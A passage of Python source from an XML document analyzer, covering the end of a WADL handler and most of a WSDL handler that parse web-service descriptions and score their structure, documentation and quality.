            'application_info': self._analyze_application(root),
            'resources': self._analyze_resources(root),
            'methods': self._analyze_methods(root),
            'parameters': self._analyze_parameters(root),
            'representations': self._analyze_representations(root),
            'grammars': self._analyze_grammars(root),
            'documentation': self._analyze_documentation(root),
            'security': self._analyze_security_patterns(root),
            'api_metrics': self._calculate_api_metrics(root)
        }
        
        recommendations = [
            "Generate interactive API documentation",
            "Create client SDKs from WADL specification",
            "Validate API endpoints against specification",
            "Analyze API design patterns and best practices",
            "Extract for API testing and automation",
            "Monitor API coverage and usage patterns",
            "Generate OpenAPI/Swagger equivalents",
            "Audit security and authentication patterns"
        ]
        
        ai_use_cases = [
            "Automated API documentation generation",
            "Client code generation and scaffolding",
            "API testing and validation automation",
            "REST API pattern analysis",
            "Service dependency mapping",
            "API versioning and compatibility checking",
            "Security vulnerability assessment",
            "Performance optimization recommendations",
            "API usage analytics and insights",
            "Microservices architecture analysis"
        ]
        
        return SpecializedAnalysis(
            document_type="WADL API Description",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory={
                'total_resources': findings['resources']['resource_count'],
                'total_methods': findings['methods']['method_count'],
                'total_parameters': findings['parameters']['parameter_count'],
                'representation_formats': len(findings['representations']['media_types']),
                'documentation_coverage': findings['documentation']['coverage_score']
            },
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._assess_api_quality(findings)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'api_specification': self._extract_api_spec(root),
            'endpoint_catalog': self._extract_endpoints(root),
            'data_models': self._extract_data_models(root),
            'authentication_info': self._extract_auth_info(root),
            'error_responses': self._extract_error_responses(root)
        }
    
    def _analyze_application(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze application-level information"""
        ns = self._get_namespace(root)
        app_info = {
            'base_uri': None,
            'version': None,
            'title': None,
            'description': None,
            'xmlns': None
        }
        
        # Extract application attributes
        app_info['xmlns'] = root.get('xmlns') or ns.strip('{}')
        
        # Look for resources element with base attribute
        resources = root.find(f'{ns}resources')
        if resources is not None:
            app_info['base_uri'] = resources.get('base')
        
        # Look for documentation
        doc = root.find(f'{ns}doc')
        if doc is not None:
            if doc.get('title'):
                app_info['title'] = doc.get('title')
            if doc.text:
                app_info['description'] = doc.text.strip()
        
        return app_info
    
    def _analyze_resources(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze resource definitions"""
        ns = self._get_namespace(root)
        resources_info = {
            'resource_count': 0,
            'resources': [],
            'base_paths': set(),
            'path_patterns': []
        }
        
        for resource in root.findall(f'.//{ns}resource'):
            resource_info = {
                'id': resource.get('id'),
                'path': resource.get('path'),
                'type': resource.get('type'),
                'queryType': resource.get('queryType'),
                'methods': [],
                'child_resources': 0,
                'parameters': 0,
                'documentation': None
            }
            
            # Extract path information
            if resource_info['path']:
                resources_info['path_patterns'].append(resource_info['path'])
                # Extract base path (everything before path variables)
                base_path = re.sub(r'\{[^}]+\}', '', resource_info['path']).rstrip('/')
                if base_path:
                    resources_info['base_paths'].add(base_path)
            
            # Count methods
            resource_info['methods'] = [
                method.get('name') for method in resource.findall(f'{ns}method')
                if method.get('name')
            ]
            
            # Count child resources
            resource_info['child_resources'] = len(resource.findall(f'{ns}resource'))
            
            # Count parameters
            resource_info['parameters'] = len(resource.findall(f'{ns}param'))
            
            # Extract documentation
            doc = resource.find(f'{ns}doc')
            if doc is not None and doc.text:
                resource_info['documentation'] = doc.text.strip()
            
            resources_info['resources'].append(resource_info)
        
        resources_info['resource_count'] = len(resources_info['resources'])
        resources_info['base_paths'] = list(resources_info['base_paths'])
        
        return resources_info
    
    def _analyze_methods(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze HTTP methods"""
        ns = self._get_namespace(root)
        methods_info = {
            'method_count': 0,
            'methods': [],
            'method_distribution': {},
            'response_codes': set()
        }
        
        for method in root.findall(f'.//{ns}method'):
            method_info = {
                'id': method.get('id'),
                'name': method.get('name'),
                'href': method.get('href'),
                'request_representations': [],
                'response_representations': [],
                'parameters': 0,
                'documentation': None,
                'responses': []
            }
            
            # Count method distribution
            method_name = method_info['name']
            if method_name:
                methods_info['method_distribution'][method_name] = \
                    methods_info['method_distribution'].get(method_name, 0) + 1
            
            # Analyze request
            request = method.find(f'{ns}request')
            if request is not None:
                for rep in request.findall(f'{ns}representation'):
                    media_type = rep.get('mediaType')
                    if media_type:
                        method_info['request_representations'].append(media_type)
                
                method_info['parameters'] += len(request.findall(f'{ns}param'))
            
            # Analyze responses
            for response in method.findall(f'{ns}response'):
                response_info = {
                    'status': response.get('status'),
                    'representations': []
                }
                
                if response_info['status']:
                    methods_info['response_codes'].add(response_info['status'])
                
                for rep in response.findall(f'{ns}representation'):
                    media_type = rep.get('mediaType')
                    if media_type:
                        response_info['representations'].append(media_type)
                        method_info['response_representations'].append(media_type)
                
                method_info['responses'].append(response_info)
            
            # Extract documentation
            doc = method.find(f'{ns}doc')
            if doc is not None and doc.text:
                method_info['documentation'] = doc.text.strip()
            
            methods_info['methods'].append(method_info)
        
        methods_info['method_count'] = len(methods_info['methods'])
        methods_info['response_codes'] = list(methods_info['response_codes'])
        
        return methods_info
    
    def _analyze_parameters(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze parameters"""
        ns = self._get_namespace(root)
        params_info = {
            'parameter_count': 0,
            'parameters': [],
            'parameter_styles': {},
            'parameter_types': {},
            'required_params': 0,
            'optional_params': 0
        }
        
        for param in root.findall(f'.//{ns}param'):
            param_info = {
                'id': param.get('id'),
                'name': param.get('name'),
                'style': param.get('style'),
                'type': param.get('type'),
                'default': param.get('default'),
                'required': param.get('required', 'false').lower() == 'true',
                'repeating': param.get('repeating', 'false').lower() == 'true',
                'path': param.get('path'),
                'documentation': None,
                'options': []
            }
            
            # Count parameter styles
            if param_info['style']:
                params_info['parameter_styles'][param_info['style']] = \
                    params_info['parameter_styles'].get(param_info['style'], 0) + 1
            
            # Count parameter types
            if param_info['type']:
                params_info['parameter_types'][param_info['type']] = \
                    params_info['parameter_types'].get(param_info['type'], 0) + 1
            
            # Count required vs optional
            if param_info['required']:
                params_info['required_params'] += 1
            else:
                params_info['optional_params'] += 1
            
            # Extract options
            for option in param.findall(f'{ns}option'):
                option_info = {
                    'value': option.get('value'),
                    'mediaType': option.get('mediaType')
                }
                param_info['options'].append(option_info)
            
            # Extract documentation
            doc = param.find(f'{ns}doc')
            if doc is not None and doc.text:
                param_info['documentation'] = doc.text.strip()
            
            params_info['parameters'].append(param_info)
        
        params_info['parameter_count'] = len(params_info['parameters'])
        
        return params_info
    
    def _analyze_representations(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze representation formats"""
        ns = self._get_namespace(root)
        repr_info = {
            'representation_count': 0,
            'representations': [],
            'media_types': set(),
            'elements': set(),
            'profiles': set()
        }
        
        for representation in root.findall(f'.//{ns}representation'):
            repr_data = {
                'id': representation.get('id'),
                'mediaType': representation.get('mediaType'),
                'element': representation.get('element'),
                'profile': representation.get('profile'),
                'href': representation.get('href'),
                'parameters': 0,
                'documentation': None
            }
            
            # Collect media types
            if repr_data['mediaType']:
                repr_info['media_types'].add(repr_data['mediaType'])
            
            # Collect elements
            if repr_data['element']:
                repr_info['elements'].add(repr_data['element'])
            
            # Collect profiles
            if repr_data['profile']:
                repr_info['profiles'].add(repr_data['profile'])
            
            # Count parameters
            repr_data['parameters'] = len(representation.findall(f'{ns}param'))
            
            # Extract documentation
            doc = representation.find(f'{ns}doc')
            if doc is not None and doc.text:
                repr_data['documentation'] = doc.text.strip()
            
            repr_info['representations'].append(repr_data)
        
        repr_info['representation_count'] = len(repr_info['representations'])
        repr_info['media_types'] = list(repr_info['media_types'])
        repr_info['elements'] = list(repr_info['elements'])
        repr_info['profiles'] = list(repr_info['profiles'])
        
        return repr_info
    
    def _analyze_grammars(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze grammar definitions"""
        ns = self._get_namespace(root)
        grammars_info = {
            'has_grammars': False,
            'includes': [],
            'schemas': 0,
            'documentation': None
        }
        
        grammars = root.find(f'{ns}grammars')
        if grammars is not None:
            grammars_info['has_grammars'] = True
            
            # Extract includes
            for include in grammars.findall(f'{ns}include'):
                include_info = {
                    'href': include.get('href'),
                    'media_type': include.get('mediaType')
                }
                grammars_info['includes'].append(include_info)
            
            # Count schemas (XSD schemas within grammars)
            # Look for both XSD namespace and generic schema elements
            xsd_schemas = grammars.findall('.//{http://www.w3.org/2001/XMLSchema}schema')
            generic_schemas = grammars.findall('.//schema')
            grammars_info['schemas'] = len(xsd_schemas) + len(generic_schemas)
            
            # Extract documentation
            doc = grammars.find(f'{ns}doc')
            if doc is not None and doc.text:
                grammars_info['documentation'] = doc.text.strip()
        
        return grammars_info
    
    def _analyze_documentation(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze documentation coverage"""
        ns = self._get_namespace(root)
        doc_info = {
            'total_elements': 0,
            'documented_elements': 0,
            'coverage_score': 0.0,
            'documentation_entries': []
        }
        
        # Count all documentable elements
        documentable_elements = [
            f'{ns}application', f'{ns}resources', f'{ns}resource', 
            f'{ns}method', f'{ns}param', f'{ns}representation'
        ]
        
        for elem_type in documentable_elements:
            elements = root.findall(f'.//{elem_type}')
            doc_info['total_elements'] += len(elements)
            
            for element in elements:
                doc = element.find(f'{ns}doc')
                if doc is not None and (doc.text or doc.get('title')):
                    doc_info['documented_elements'] += 1
                    
                    doc_entry = {
                        'element_type': elem_type.split('}')[-1],
                        'element_id': element.get('id'),
                        'title': doc.get('title'),
                        'content': doc.text.strip() if doc.text else None,
                        'lang': doc.get('{http://www.w3.org/XML/1998/namespace}lang')
                    }
                    doc_info['documentation_entries'].append(doc_entry)
        
        # Calculate coverage score
        if doc_info['total_elements'] > 0:
            doc_info['coverage_score'] = doc_info['documented_elements'] / doc_info['total_elements']
        
        return doc_info
    
    def _analyze_security_patterns(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze security patterns and authentication"""
        security_info = {
            'has_authentication': False,
            'auth_methods': [],
            'security_headers': [],
            'https_required': False,
            'api_keys': 0
        }
        
        # Look for common authentication patterns in parameters
        ns = self._get_namespace(root)
        for param in root.findall(f'.//{ns}param'):
            param_name = param.get('name', '').lower()
            param_style = param.get('style', '')
            
            # Check for common auth parameter names
            auth_indicators = [
                'authorization', 'auth', 'token', 'api_key', 'apikey', 
                'access_token', 'bearer', 'key', 'secret'
            ]
            
            if any(auth in param_name for auth in auth_indicators):
                security_info['has_authentication'] = True
                auth_method = f"{param_style}:{param_name}" if param_style else param_name
                security_info['auth_methods'].append(auth_method)
                
                if 'key' in param_name:
                    security_info['api_keys'] += 1
        
        # Check for HTTPS requirement in base URI
        app_info = self._analyze_application(root)
        if app_info['base_uri'] and app_info['base_uri'].startswith('https://'):
            security_info['https_required'] = True
        
        # Look for security-related headers in representations
        for representation in root.findall(f'.//{ns}representation'):
            for param in representation.findall(f'{ns}param'):
                param_name = param.get('name', '').lower()
                if param.get('style') == 'header' and any(
                    sec in param_name for sec in ['auth', 'token', 'key', 'bearer']
                ):
                    security_info['security_headers'].append(param_name)
        
        return security_info
    
    def _calculate_api_metrics(self, root: ET.Element) -> Dict[str, Any]:
        """Calculate API complexity and design metrics"""
        metrics = {
            'complexity_score': 0.0,
            'resource_depth': 0,
            'avg_methods_per_resource': 0.0,
            'avg_params_per_method': 0.0,
            'crud_completeness': 0.0,
            'documentation_ratio': 0.0
        }
        
        # Get analysis data
        resources = self._analyze_resources(root)
        methods = self._analyze_methods(root)
        documentation = self._analyze_documentation(root)
        
        # Calculate resource depth (max nesting)
        ns = self._get_namespace(root)
        metrics['resource_depth'] = self._calculate_max_resource_depth(root, ns)
        
        # Calculate averages
        if resources['resource_count'] > 0:
            total_methods = sum(len(r['methods']) for r in resources['resources'])
            metrics['avg_methods_per_resource'] = total_methods / resources['resource_count']
        
        if methods['method_count'] > 0:
            total_params = sum(m['parameters'] for m in methods['methods'])
            metrics['avg_params_per_method'] = total_params / methods['method_count']
        
        # Calculate CRUD completeness
        http_methods = set(methods['method_distribution'].keys())
        crud_methods = {'GET', 'POST', 'PUT', 'DELETE'}
        if crud_methods:
            metrics['crud_completeness'] = len(http_methods & crud_methods) / len(crud_methods)
        
        # Documentation ratio
        metrics['documentation_ratio'] = documentation['coverage_score']
        
        # Overall complexity score
        complexity_factors = [
            min(resources['resource_count'] / 20.0, 1.0) * 0.3,  # Resource count
            min(metrics['resource_depth'] / 5.0, 1.0) * 0.2,    # Nesting depth
            min(methods['method_count'] / 50.0, 1.0) * 0.3,     # Method count
            min(metrics['avg_params_per_method'] / 10.0, 1.0) * 0.2  # Parameter complexity
        ]
        metrics['complexity_score'] = sum(complexity_factors)
        
        return metrics
    
    def _extract_api_spec(self, root: ET.Element) -> Dict[str, Any]:
        """Extract high-level API specification"""
        app_info = self._analyze_application(root)
        resources = self._analyze_resources(root)
        methods = self._analyze_methods(root)
        
        return {
            'base_uri': app_info['base_uri'],
            'title': app_info['title'],
            'description': app_info['description'],
            'version': app_info['version'],
            'resource_count': resources['resource_count'],
            'method_count': methods['method_count'],
            'supported_methods': list(methods['method_distribution'].keys()),
            'base_paths': resources['base_paths'][:10]  # Limit for readability
        }
    
    def _extract_endpoints(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract API endpoints with methods"""
        endpoints = []
        ns = self._get_namespace(root)
        
        # Get base URI
        app_info = self._analyze_application(root)
        base_uri = app_info['base_uri'] or ''
        
        for resource in root.findall(f'.//{ns}resource')[:50]:  # Limit for performance
            resource_path = resource.get('path', '')
            
            for method in resource.findall(f'{ns}method'):
                endpoint = {
                    'path': resource_path,
                    'full_url': urljoin(base_uri, resource_path) if base_uri else resource_path,
                    'method': method.get('name'),
                    'method_id': method.get('id'),
                    'parameters': [],
                    'request_formats': [],
                    'response_formats': [],
                    'description': None
                }
                
                # Extract parameters
                for param in method.findall(f'.//{ns}param'):
                    param_info = {
                        'name': param.get('name'),
                        'style': param.get('style'),
                        'type': param.get('type'),
                        'required': param.get('required', 'false').lower() == 'true'
                    }
                    endpoint['parameters'].append(param_info)
                
                # Extract request formats
                request = method.find(f'{ns}request')
                if request is not None:
                    for rep in request.findall(f'{ns}representation'):
                        media_type = rep.get('mediaType')
                        if media_type:
                            endpoint['request_formats'].append(media_type)
                
                # Extract response formats
                for response in method.findall(f'{ns}response'):
                    for rep in response.findall(f'{ns}representation'):
                        media_type = rep.get('mediaType')
                        if media_type:
                            endpoint['response_formats'].append(media_type)
                
                # Extract documentation
                doc = method.find(f'{ns}doc')
                if doc is not None and doc.text:
                    endpoint['description'] = doc.text.strip()
                
                endpoints.append(endpoint)
        
        return endpoints
    
    def _extract_data_models(self, root: ET.Element) -> Dict[str, Any]:
        """Extract data models from grammars and representations"""
        models = {
            'schemas': [],
            'elements': [],
            'media_types': []
        }
        
        ns = self._get_namespace(root)
        
        # Extract from grammars
        grammars = root.find(f'{ns}grammars')
        if grammars is not None:
            # Extract schema references
            for include in grammars.findall(f'{ns}include'):
                schema_info = {
                    'type': 'external_schema',
                    'href': include.get('href'),
                    'media_type': include.get('mediaType')
                }
                models['schemas'].append(schema_info)
            
            # Extract inline schemas
            xsd_schemas = grammars.findall('.//{http://www.w3.org/2001/XMLSchema}schema')
            for schema in xsd_schemas:
                schema_info = {
                    'type': 'inline_xsd',
                    'target_namespace': schema.get('targetNamespace'),
                    'element_count': len(schema.findall('.//{http://www.w3.org/2001/XMLSchema}element'))
                }
                models['schemas'].append(schema_info)
        
        # Extract elements from representations
        representations = self._analyze_representations(root)
        models['elements'] = representations['elements']
        models['media_types'] = representations['media_types']
        
        return models
    
    def _extract_auth_info(self, root: ET.Element) -> Dict[str, Any]:
        """Extract authentication information"""
        security = self._analyze_security_patterns(root)
        
        return {
            'has_authentication': security['has_authentication'],
            'auth_methods': security['auth_methods'],
            'api_key_count': security['api_keys'],
            'requires_https': security['https_required'],
            'security_headers': security['security_headers']
        }
    
    def _extract_error_responses(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract error response definitions"""
        errors = []
        ns = self._get_namespace(root)
        
        for response in root.findall(f'.//{ns}response'):
            status = response.get('status')
            if status and (status.startswith('4') or status.startswith('5')):
                error_info = {
                    'status_code': status,
                    'representations': [],
                    'documentation': None
                }
                
                # Extract error representations
                for rep in response.findall(f'{ns}representation'):
                    media_type = rep.get('mediaType')
                    if media_type:
                        error_info['representations'].append(media_type)
                
                # Extract error documentation
                doc = response.find(f'{ns}doc')
                if doc is not None and doc.text:
                    error_info['documentation'] = doc.text.strip()
                
                errors.append(error_info)
        
        return errors[:20]  # Limit
    
    def _assess_api_quality(self, findings: Dict[str, Any]) -> Dict[str, float]:
        """Assess API design quality"""
        metrics = {
            'design_quality': 0.0,
            'documentation_quality': 0.0,
            'completeness': 0.0,
            'consistency': 0.0,
            'overall': 0.0
        }
        
        # Design quality (RESTful patterns, HTTP method usage)
        methods_dist = findings['methods']['method_distribution']
        api_metrics = findings['api_metrics']
        
        # Check for RESTful design
        design_score = 0.0
        if 'GET' in methods_dist:
            design_score += 0.3  # Read operations
        if any(method in methods_dist for method in ['POST', 'PUT', 'PATCH']):
            design_score += 0.3  # Write operations
        if 'DELETE' in methods_dist:
            design_score += 0.2  # Delete operations
        if api_metrics['crud_completeness'] > 0.75:
            design_score += 0.2  # CRUD completeness
        
        metrics['design_quality'] = min(design_score, 1.0)
        
        # Documentation quality
        doc_coverage = findings['documentation']['coverage_score']
        metrics['documentation_quality'] = doc_coverage
        
        # Completeness (resources, methods, parameters)
        completeness_factors = []
        if findings['resources']['resource_count'] > 0:
            completeness_factors.append(0.4)
        if findings['methods']['method_count'] > 0:
            completeness_factors.append(0.4)
        if findings['parameters']['parameter_count'] > 0:
            completeness_factors.append(0.2)
        
        metrics['completeness'] = sum(completeness_factors)
        
        # Consistency (parameter naming, response formats)
        consistency_score = 0.5  # Base score
        
        # Check media type consistency
        repr_info = findings['representations']
        if len(repr_info['media_types']) <= 3:  # Not too many different formats
            consistency_score += 0.2
        
        # Check parameter style consistency
        param_styles = findings['parameters']['parameter_styles']
        if len(param_styles) <= 2:  # Consistent parameter styles
            consistency_score += 0.3
        
        metrics['consistency'] = min(consistency_score, 1.0)
        
        # Overall quality
        metrics['overall'] = (
            metrics['design_quality'] * 0.3 +
            metrics['documentation_quality'] * 0.25 +
            metrics['completeness'] * 0.25 +
            metrics['consistency'] * 0.2
        )
        
        return metrics
    
    def _calculate_max_resource_depth(self, root: ET.Element, ns: str, current_depth: int = 0) -> int:
        """Calculate maximum resource nesting depth"""
        max_depth = current_depth
        
        for resource in root.findall(f'{ns}resource'):
            child_depth = self._calculate_max_resource_depth(resource, ns, current_depth + 1)
            max_depth = max(max_depth, child_depth)
        
        return max_depth
</file>

<file path="src/handlers/wsdl_handler.py">
#!/usr/bin/env python3
"""
WSDL (Web Services Description Language) Handler

Analyzes WSDL files to extract service definitions, operations,
message schemas, and binding information for SOAP web services.
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import re
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class WSDLHandler(XMLHandler):
    """Handler for WSDL (Web Services Description Language) documents"""
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        # Check for WSDL root element
        if root.tag.endswith('definitions') or root.tag == 'definitions':
            # Check for WSDL namespace
            if any('schemas.xmlsoap.org/wsdl' in uri for uri in namespaces.values()):
                return True, 1.0
            return True, 0.7
        
        # WSDL 2.0 uses 'description' as root
        if root.tag.endswith('description') or root.tag == 'description':
            if any('w3.org/ns/wsdl' in uri for uri in namespaces.values()):
                return True, 0.9
        
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        # Determine WSDL version
        version = "1.1"  # Default
        if root.tag.endswith('description') or any('w3.org/ns/wsdl' in uri for uri in namespaces.values()):
            version = "2.0"
        
        target_namespace = root.get('targetNamespace', '')
        
        return DocumentTypeInfo(
            type_name="WSDL Service Definition",
            confidence=1.0,
            version=version,
            schema_uri=target_namespace,
            metadata={
                "standard": f"WSDL {version}",
                "category": "web_service_definition",
                "protocol": "SOAP"
            }
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        # Determine version for proper parsing
        is_wsdl2 = root.tag.endswith('description') or 'w3.org/ns/wsdl' in str(root.attrib.values())
        
        if is_wsdl2:
            findings = self._analyze_wsdl2(root)
        else:
            findings = self._analyze_wsdl1(root)
        
        recommendations = [
            "Generate client code from WSDL",
            "Extract operation documentation",
            "Analyze service dependencies",
            "Create API test cases from operations",
            "Map SOAP operations to REST endpoints",
            "Monitor deprecated operations"
        ]
        
        ai_use_cases = [
            "SOAP to REST API migration",
            "Service dependency mapping",
            "API documentation generation",
            "Test case generation",
            "Service compatibility checking",
            "Operation complexity analysis",
            "Security policy extraction",
            "Performance bottleneck identification"
        ]
        
        return SpecializedAnalysis(
            document_type="WSDL Service Definition",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory={
                'services': len(findings.get('services', [])),
                'operations': findings.get('total_operations', 0),
                'messages': len(findings.get('messages', [])),
                'types': len(findings.get('types', [])),
                'bindings': len(findings.get('bindings', []))
            },
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._assess_wsdl_quality(findings)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        is_wsdl2 = root.tag.endswith('description')
        
        if is_wsdl2:
            return self._extract_wsdl2_data(root)
        else:
            return self._extract_wsdl1_data(root)
    
    def _analyze_wsdl1(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze WSDL 1.1 document"""
        findings = {
            'services': self._extract_services(root),
            'port_types': self._extract_port_types(root),
            'operations': self._extract_operations(root),
            'messages': self._extract_messages(root),
            'types': self._extract_types(root),
            'bindings': self._extract_bindings(root),
            'imports': self._extract_imports(root),
            'total_operations': 0
        }
        
        # Count total operations
        for port_type in findings['port_types']:
            findings['total_operations'] += len(port_type.get('operations', []))
        
        return findings
    
    def _analyze_wsdl2(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze WSDL 2.0 document"""
        # WSDL 2.0 has different structure
        findings = {
            'services': self._extract_services_v2(root),
            'interfaces': self._extract_interfaces_v2(root),
            'operations': self._extract_operations_v2(root),
            'types': self._extract_types(root),  # Similar to 1.1
            'bindings': self._extract_bindings_v2(root),
            'imports': self._extract_imports(root),
            'total_operations': 0
        }
        
        # Count operations
        for interface in findings['interfaces']:
            findings['total_operations'] += len(interface.get('operations', []))
        
        return findings
    
    def _extract_services(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract service definitions from WSDL 1.1"""
        services = []
        
        for service in root.findall('.//{http://schemas.xmlsoap.org/wsdl/}service'):
            service_info = {
                'name': service.get('name'),
                'documentation': self._get_documentation(service),
                'ports': []
            }
            
            # Extract ports
            for port in service.findall('.//{http://schemas.xmlsoap.org/wsdl/}port'):
                port_info = {
                    'name': port.get('name'),
                    'binding': port.get('binding'),
                    'address': None
                }
                
                # Get SOAP address
                soap_addr = port.find('.//{http://schemas.xmlsoap.org/wsdl/soap/}address')
                if soap_addr is not None:
                    port_info['address'] = soap_addr.get('location')
                
                # Check for SOAP 1.2
                soap12_addr = port.find('.//{http://schemas.xmlsoap.org/wsdl/soap12/}address')
                if soap12_addr is not None:
                    port_info['address'] = soap12_addr.get('location')
                    port_info['soap_version'] = '1.2'
                
                service_info['ports'].append(port_info)
            
            services.append(service_info)
        
        return services
    
    def _extract_port_types(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract port types (interfaces) from WSDL 1.1"""
        port_types = []
        
        for pt in root.findall('.//{http://schemas.xmlsoap.org/wsdl/}portType'):
            pt_info = {
                'name': pt.get('name'),
                'operations': []
            }
            
            # Extract operations
            for op in pt.findall('.//{http://schemas.xmlsoap.org/wsdl/}operation'):
                op_info = {
                    'name': op.get('name'),
                    'documentation': self._get_documentation(op),
                    'input': None,
                    'output': None,
                    'faults': []
                }
                
                # Input message
                input_elem = op.find('.//{http://schemas.xmlsoap.org/wsdl/}input')
                if input_elem is not None:
                    op_info['input'] = input_elem.get('message')
                
                # Output message
                output_elem = op.find('.//{http://schemas.xmlsoap.org/wsdl/}output')
                if output_elem is not None:
                    op_info['output'] = output_elem.get('message')
                
                # Fault messages
                for fault in op.findall('.//{http://schemas.xmlsoap.org/wsdl/}fault'):
                    op_info['faults'].append({
                        'name': fault.get('name'),
                        'message': fault.get('message')
                    })
                
                pt_info['operations'].append(op_info)
            
            port_types.append(pt_info)
        
        return port_types
    
    def _extract_operations(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract all operations with details"""
        operations = []
        
        for pt in root.findall('.//{http://schemas.xmlsoap.org/wsdl/}portType'):
            port_type_name = pt.get('name')
            
            for op in pt.findall('.//{http://schemas.xmlsoap.org/wsdl/}operation'):
                operations.append({
                    'name': op.get('name'),
                    'port_type': port_type_name,
                    'pattern': self._determine_mep(op),  # Message Exchange Pattern
                    'documentation': self._get_documentation(op)
                })
        
        return operations
    
    def _extract_messages(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract message definitions"""
        messages = []
        
        for msg in root.findall('.//{http://schemas.xmlsoap.org/wsdl/}message'):
            msg_info = {
                'name': msg.get('name'),
                'parts': []
            }
            
            # Extract parts
            for part in msg.findall('.//{http://schemas.xmlsoap.org/wsdl/}part'):
                part_info = {
                    'name': part.get('name'),
                    'type': part.get('type'),
                    'element': part.get('element')
                }
                msg_info['parts'].append(part_info)
            
            messages.append(msg_info)
        
        return messages
    
    def _extract_types(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract type definitions from embedded schemas"""
        types = []
        
        types_section = root.find('.//{http://schemas.xmlsoap.org/wsdl/}types')
        if types_section is None:
            return types
        
        # Find all schemas
        for schema in types_section.findall('.//{http://www.w3.org/2001/XMLSchema}schema'):
            target_ns = schema.get('targetNamespace', 'default')
            
            # Extract complex types
            for ct in schema.findall('.//{http://www.w3.org/2001/XMLSchema}complexType'):
                types.append({
                    'name': ct.get('name'),
                    'namespace': target_ns,
                    'kind': 'complex'
                })
            
            # Extract simple types
            for st in schema.findall('.//{http://www.w3.org/2001/XMLSchema}simpleType'):
                types.append({
                    'name': st.get('name'),
                    'namespace': target_ns,
                    'kind': 'simple'
                })
            
            # Extract elements
            for elem in schema.findall('.//{http://www.w3.org/2001/XMLSchema}element'):
                if elem.get('name'):
                    types.append({
                        'name': elem.get('name'),
                        'namespace': target_ns,
                        'kind': 'element'
                    })
        
        return types
    
    def _extract_bindings(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract binding definitions"""
        bindings = []
        
        for binding in root.findall('.//{http://schemas.xmlsoap.org/wsdl/}binding'):
            binding_info = {
                'name': binding.get('name'),
                'type': binding.get('type'),
                'protocol': 'unknown',
                'style': None,
                'transport': None,
                'operations': []
            }
            
            # Check for SOAP binding
            soap_binding = binding.find('.//{http://schemas.xmlsoap.org/wsdl/soap/}binding')
            if soap_binding is not None:
                binding_info['protocol'] = 'SOAP'
                binding_info['style'] = soap_binding.get('style', 'document')
                binding_info['transport'] = soap_binding.get('transport')
            
            # Extract operation bindings
            for op in binding.findall('.//{http://schemas.xmlsoap.org/wsdl/}operation'):
                op_binding = {
                    'name': op.get('name'),
                    'soap_action': None,
                    'style': None
                }
                
                soap_op = op.find('.//{http://schemas.xmlsoap.org/wsdl/soap/}operation')
                if soap_op is not None:
                    op_binding['soap_action'] = soap_op.get('soapAction')
                    op_binding['style'] = soap_op.get('style')
                
                binding_info['operations'].append(op_binding)
            
            bindings.append(binding_info)
        
        return bindings
    
    def _extract_imports(self, root: ET.Element) -> List[Dict[str, str]]:
        """Extract import statements"""
        imports = []
        
        for imp in root.findall('.//{http://schemas.xmlsoap.org/wsdl/}import'):
            imports.append({
                'namespace': imp.get('namespace'),
                'location': imp.get('location')
            })
        
        return imports
    
    # WSDL 2.0 specific methods
    def _extract_services_v2(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract services from WSDL 2.0"""
        services = []
        
        for service in root.findall('.//{http://www.w3.org/ns/wsdl}service'):
            service_info = {
                'name': service.get('name'),
                'interface': service.get('interface'),
                'endpoints': []
            }
            
            for endpoint in service.findall('.//{http://www.w3.org/ns/wsdl}endpoint'):
                service_info['endpoints'].append({
                    'name': endpoint.get('name'),
                    'binding': endpoint.get('binding'),
                    'address': endpoint.get('address')
                })
            
            services.append(service_info)
        
        return services
    
    def _extract_interfaces_v2(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract interfaces from WSDL 2.0 (equivalent to portType in 1.1)"""
        interfaces = []
        
        for interface in root.findall('.//{http://www.w3.org/ns/wsdl}interface'):
            interface_info = {
                'name': interface.get('name'),
                'extends': interface.get('extends'),
                'operations': []
            }
            
            for op in interface.findall('.//{http://www.w3.org/ns/wsdl}operation'):
                interface_info['operations'].append({
                    'name': op.get('name'),
                    'pattern': op.get('pattern'),
                    'style': op.get('style')
                })
            
            interfaces.append(interface_info)
        
        return interfaces
    
    def _extract_operations_v2(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract operations from WSDL 2.0"""
        operations = []
        
        for interface in root.findall('.//{http://www.w3.org/ns/wsdl}interface'):
            interface_name = interface.get('name')
            
            for op in interface.findall('.//{http://www.w3.org/ns/wsdl}operation'):
                operations.append({
                    'name': op.get('name'),
                    'interface': interface_name,
                    'pattern': op.get('pattern', 'in-out'),
                    'safe': op.get('safe', 'false') == 'true'
                })
        
        return operations
    
